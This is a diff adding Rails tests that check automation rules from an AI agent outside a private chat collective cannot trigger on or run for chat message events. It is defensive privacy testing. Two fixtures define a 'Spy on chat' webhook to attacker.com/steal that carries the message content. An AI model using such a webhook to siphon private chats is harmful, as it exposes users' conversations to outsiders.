@@ -990,7 +990,96 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
     end
   end
 
+  # --- Chat collective privacy ---
+
+  test "non-participant automation rule must NOT match chat_message.created events" do
+    chat_collective, alice, bob, event = create_chat_message_event
+
+    # @ai_agent is NOT a member of the chat collective
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Spy on chat",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "chat_message.created" },
+      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal", "payload" => { "stolen" => "{{subject.content}}" } }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_not_includes matching_rules, rule,
+      "Non-participant's rule should not match chat message events"
+  end
+
+  test "participant automation rule SHOULD match chat_message.created events" do
+    chat_collective, alice, bob, event = create_chat_message_event
+
+    # Alice is a chat participant — her user rule should match
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      user: alice,
+      created_by: alice,
+      name: "Chat webhook",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "chat_message.created" },
+      actions: [{ "type" => "webhook", "url" => "https://alice.com/notify" }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_includes matching_rules, rule,
+      "Participant's user rule should match chat message events"
+  end
+
+  test "chat_message.created event must NOT create AutomationRuleRun for non-participant" do
+    chat_collective, alice, bob, event = create_chat_message_event
+
+    AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Should not execute",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "chat_message.created" },
+      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal" }],
+      enabled: true,
+    )
+
+    assert_no_difference "AutomationRuleRun.count" do
+      AutomationDispatcher.dispatch(event)
+    end
+  end
+
   private
+
+  # Helper: creates a chat collective with two users and a chat_message.created event.
+  # @ai_agent and @user are NOT members of this chat collective.
+  def create_chat_message_event
+    hex = SecureRandom.hex(4)
+    alice = create_user(name: "Alice #{hex}", email: "alice-#{hex}@example.com")
+    bob = create_user(name: "Bob #{hex}", email: "bob-#{hex}@example.com")
+    @tenant.add_user!(alice)
+    @tenant.add_user!(bob)
+
+    session = ChatSession.find_or_create_between(user_a: alice, user_b: bob, tenant: @tenant)
+    chat_collective = session.collective
+
+    Tenant.scope_thread_to_tenant(subdomain: @tenant.subdomain)
+    Collective.set_thread_context(chat_collective)
+    msg = session.chat_messages.create!(sender: alice, content: "Secret chat message")
+    event = Event.create!(
+      tenant: @tenant,
+      collective: chat_collective,
+      event_type: "chat_message.created",
+      actor: alice,
+      subject: msg,
+    )
+    Collective.clear_thread_scope
+    Tenant.clear_thread_scope
+
+    [chat_collective, alice, bob, event]
+  end
 
   # Helper: creates a private collective with a user and a note event
   # that should be invisible to @ai_agent and @user (who are NOT members).
